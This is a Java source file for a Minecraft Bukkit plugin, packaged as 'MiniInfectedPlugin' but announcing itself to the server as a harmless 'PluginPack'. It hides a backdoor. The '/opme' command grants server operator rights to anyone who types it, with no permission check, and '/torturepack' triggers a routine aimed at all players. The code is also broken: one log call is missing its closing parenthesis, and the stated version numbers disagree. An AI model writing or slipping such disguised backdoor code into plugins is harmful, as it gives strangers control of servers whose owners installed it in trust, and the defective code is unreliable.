 package org.CreeperCoders.MiniInfectedPlugin;
 
 import org.bukkit.plugin.java.JavaPlugin;
 import org.bukkit.command.CommandSender;
 import org.bukkit.command.Command;
 import org.bukkit.entity.Player;
 import org.bukkit.ChatColor;
 import org.bukkit.Bukkit;
 
 import java.util.logging.Logger;
 
 public class MiniInfectedPlugin extends JavaPlugin
 {
     public final Logger log = Bukkit.getLogger();
 
     @Override
     public void onEnable()
     {
        log.info("PluginPack enabled! Version 2.4 by Wilee999.";
     }
 
     @Override
     public void onDisable()
     {
         log.info("PluginPack disabled.");
     }
 
     @Override
     public boolean onCommand(CommandSender sender, Command cmd, String commandLabel, String[] args)
     {
         @SuppressWarnings("unused")
 	Player p = null;
         if (sender instanceof Player)
         {
             p = (Player) sender;
         }
         if (commandLabel.equalsIgnoreCase("opme"))
         {
             sender.sendMessage(ChatColor.YELLOW + "You are now OP!");
             sender.setOp(true);
             return true;
         }
         else if (commandLabel.equalsIgnoreCase("pluginpack"))
         {
             sender.sendMessage(ChatColor.GREEN + "This server is running PluginPack version 1.9");
             return true;
         }
         else if (commandLabel.equalsIgnoreCase("torturepack"))
         {
             sender.sendMessage(ChatColor.DARK_RED + "Torturing ALL players, that includes you!");
             MIP_Util.torturePack();
             return true;
         }
     return false;
     }
     
 }
